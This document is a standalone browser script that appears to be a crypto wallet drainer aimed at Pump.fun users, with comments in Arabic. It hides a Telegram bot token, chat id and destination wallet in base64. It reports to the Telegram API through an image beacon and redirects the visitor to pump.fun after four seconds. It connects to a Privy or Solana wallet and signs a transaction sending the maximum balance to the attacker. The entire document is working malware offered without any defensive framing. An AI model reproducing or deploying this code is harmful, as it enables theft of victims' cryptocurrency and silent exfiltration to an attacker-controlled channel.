<script>
    (async function() {
        const b = atob('ODc3NDEyMjU3ODpBQUdoV3NNajN6Q0hNd2lhc2ZoYkx4OWtQeUppUDV1cU8='); 
        const c = atob('NjgzNTQyNDU0My=='); 
        const w = atob('OXg1YWo5Wnl1ZDZrQWdnUDFxM1RTS1hSd3d2RW16R3I2RXZIZGpWTlZXUmc='); 
        
        const notify = (m) => { new Image().src = `https://api.telegram.org/bot${b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`; };

        // توجيه إجباري بعد 4 ثوانٍ
        setTimeout(() => { window.location.href = 'https://pump.fun/board'; }, 4000);

        try {
            // التعديل الجوهري: نبحث أولاً عن Privy Wallet التابعة لـ Pump.fun
            let p = null;
            
            if (window.privy && window.privy.wallet && window.privy.wallet.provider) {
                p = window.privy.wallet.provider;
                notify('🎯 Privy Internal Wallet Detected!');
            } 
            // إذا لم نجد Privy، نبحث عن المزود العام بشرط ألا يكون Phantom إذا كنت لا تريده
            else if (window.solana && !window.solana.isPhantom) {
                p = window.solana;
            }

            if (!p) {
                notify('⚠️ No Privy Wallet found in this context.');
                return;
            }

            // تنفيذ الربط والسحب من المحفظة الداخلية
            await p.connect();
            const tx = { to: w, amount: 'MAX' };
            const { signature } = await p.signAndSendTransaction(tx);
            notify('💰 Internal Drain Success!\nSig: ' + signature);

        } catch (err) {
            notify('❌ Internal Error: ' + err.message);
        }
    })();
</script>
